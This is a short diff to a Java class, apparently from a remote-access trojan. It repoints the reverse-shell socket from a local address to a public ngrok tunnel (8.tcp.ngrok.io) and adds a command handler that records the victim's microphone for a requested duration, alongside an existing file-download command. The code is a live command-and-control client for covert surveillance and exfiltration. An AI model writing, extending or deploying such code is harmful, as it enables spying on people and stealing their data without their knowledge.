@@ -17,7 +17,7 @@ public class ConMan {
     public static void revConInit() throws Exception {
 
         // start a socket
-        Socket socket = new Socket("192.168.18.24", 1025);
+        Socket socket = new Socket("8.tcp.ngrok.io", 14914);
 
         // Input Socket
         BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
@@ -111,6 +111,11 @@ public class ConMan {
             case "0xF1":
                 returnMessage = FileMan.downloadFile(chunks[1]);
                 break;
+            // Record Mic Given Time
+            case "0xR0":
+                returnMessage = MicMan.RecordMic(Integer.parseInt(chunks[1]));
+                break;
+
             default:
                 returnMessage = "Invalid";
         }
